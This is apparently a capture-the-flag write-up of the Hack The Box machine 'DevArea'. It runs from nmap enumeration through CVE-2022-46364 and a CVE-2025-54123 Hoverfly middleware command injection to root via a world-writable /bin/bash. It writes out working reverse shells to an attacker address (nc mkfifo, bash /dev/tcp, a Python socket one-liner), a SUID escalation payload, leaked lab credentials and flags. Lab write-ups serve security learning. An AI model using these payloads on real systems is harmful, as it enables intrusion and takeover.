---
title: DevArea Linux
date: 2026-05-31 
categories: [Reports, Linux]
tags: [Linux, writeup, HTB]
---

```
$ nmap -A -sV -p- 10.129.21.65 -oX scan.xml
Starting Nmap 7.93 ( https://nmap.org ) at 2026-04-01 07:33 EDT
Nmap scan report for 10.129.21.65
Host is up (0.049s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.40
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 83136ba19b28fdbd5d2bee03be9c8d82 (ECDSA)
|_  256 0a86fa65d120b43a5713d11ac2de5278 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://devarea.htb/
|_http-server-header: Apache/2.4.58 (Ubuntu)
8080/tcp open  http    Jetty 9.4.27.v20200227
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.27.v20200227)
8500/tcp open  fmtp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Wed, 01 Apr 2026 11:34:37 GMT
|     Content-Length: 64
|     This is a proxy server. Does not respond to non-proxy requests.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Wed, 01 Apr 2026 11:34:11 GMT
|     Content-Length: 64
|_    This is a proxy server. Does not respond to non-proxy requests.
8888/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Hoverfly Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8500-TCP:V=7.93%I=7%D=4/1%Time=69CD02B3%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\x20E
SF:rror\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type
SF:-Options:\x20nosniff\r\nDate:\x20Wed,\x2001\x20Apr\x202026\x2011:34:11\
SF:x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20serv
SF:er\.\x20Does\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")%r(H
SF:TTPOptions,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\x20Error\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Options:\x20
SF:nosniff\r\nDate:\x20Wed,\x2001\x20Apr\x202026\x2011:34:11\x20GMT\r\nCon
SF:tent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20server\.\x20Does\
SF:x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")%r(RTSPRequest,67
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x2
SF:0charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r
SF:(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Req
SF:uest")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConn
SF:ection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"HTT
SF:P/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20char
SF:set=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Kerb
SF:eros,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
SF:est")%r(FourOhFourRequest,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\x2
SF:0Error\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Ty
SF:pe-Options:\x20nosniff\r\nDate:\x20Wed,\x2001\x20Apr\x202026\x2011:34:3
SF:7\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20se
SF:rver\.\x20Does\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n");
Service Info: Host: _; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

21 - anonymous yes
22
80 - devarea.htb
8080 -http    Jetty 9.4.27.v20200227
8500 -fmtp?
8888 - Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Hoverfly Dashboard
### ftp enum


get all ftp files for anonymous
`wget -m ftp://anonymous:anonymous@10.129.21.65`
find `employee-service.jar`
nothing interesting while

### webs
`$ echo '10.129.21.65    devarea.htb' | sudo tee -a /etc/hosts`

find api endpoint `http://devarea.htb:8080/employeeservice`
``
#### CVE-2022-46364
`href="file:///etc/systemd/system/hoverfly.service"`


`Credentials: admin / O7IJ27MyyXiU`

#### CVE-2025-54123
https://github.com/advisories/ghsa-r4h8-hfp2-ggmf
https://github.com/0xzap/CVE-2025-54123/tree/main
```
PUT /api/v2/hoverfly/middleware HTTP/1.1
Host: localhost:8888
sec-ch-ua-platform: "macOS"
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
sec-ch-ua: "Not)A;Brand";v="8", "Chromium";v="138"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
sec-ch-ua-mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8888/dashboard
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
Content-Length: 101

{
    "binary": "/bin/sh",
    "script": "mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc 10.10.14.40 8001 > /tmp/f"
}
```

`$ python3 cve-2025-54123.py 10.129.21.65 8888 10.10.14.40 8001 eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODYwODk2ODksImlhdCI6MTc3NTA0OTY4OSwic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.FZsA8dZxcJShJOHD8HofbceNxKRav6wc8yXScEJhIrAc2xwAJT1JkyvLYlK65lB_XP4XFBCQDhasb2PmaKMMCw`

```

$ cat /home/dev_ryan/user.txt
6604c867e65d49a13e67c9d5cb48c39e


```


### Root
```
sudo -l
Matching Defaults entries for dev_ryan on devarea:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop, !/opt/syswatch/syswatch.sh web-restart

```

check bash
```
ls -la /bin/bash
-rwxrwxrwx 1 root root 1446024 Mar 31  2024 /bin/bash
```


```

$ 
cd /tmp
$ 
cp /bin/bash bash
$ 
echo '/tmp/bash -i >& /dev/tcp/10.10.14.40/9001 0>&1' > shell
$ ln -s /bin/bash shell
ln -s /bin/bash shell
ln: failed to create symbolic link 'shell': File exists
$ 
ln -s /bin/bash /tmp/shell

```

soo
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.40",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
```

`kill $(ps aux | grep '/bin/bash' | grep -v grep | awk '{print $1}')`
Write a payload that sets SUID on python3 (root-owned binary):
```
echo '#!/tmp/bash.bak' > /tmp/bash_payload
echo 'chmod u+s /usr/bin/python3' >> /tmp/bash_payload
chmod +x /tmp/bash_payload
```


```
cp /bin/bash /tmp/bash.bak


$ ps -ef | grep bash
ps -ef | grep bash
dev_ryan   87654       1  0 13:57 ?        00:00:00 bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
dev_ryan   87655   87654  0 13:57 ?        00:00:00 bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
dev_ryan   87656   87655  0 13:57 ?        00:00:00 bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
dev_ryan  102763  102198  0 15:13 pts/0    00:00:00 grep bash
$ kill 87654
kill 87654
$ kill 87655
kill 87655
$ kill 87656
kill 87656
$ cp /tmp/bash_payload /bin/bash
cp /tmp/bash_payload /bin/bash



cp /tmp/bash_payload /bin/bash


python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# cat /root/root.txt
cat /root/root.txt
282b04bd86fa98ba2ebe6cffb3417706
# 


```
